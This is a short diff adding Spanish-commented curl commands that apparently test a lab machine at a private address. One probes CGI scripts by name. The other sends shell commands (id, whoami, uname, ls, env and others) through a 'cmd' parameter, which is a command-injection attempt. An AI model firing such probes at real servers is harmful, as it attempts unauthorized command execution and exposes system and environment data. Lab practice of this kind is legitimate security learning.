@@ -1,0 +1,4 @@
+# comando para probar contra el directorio /cgi-bin/
+curl -i -s http://192.168.56.96/cgi-bin/{admin,test,status,printenv}
+
+curl -s http://192.168.56.96/cgi-bin/status?cmd={id,whoami,uname,ls,ps,df,uptime,env}
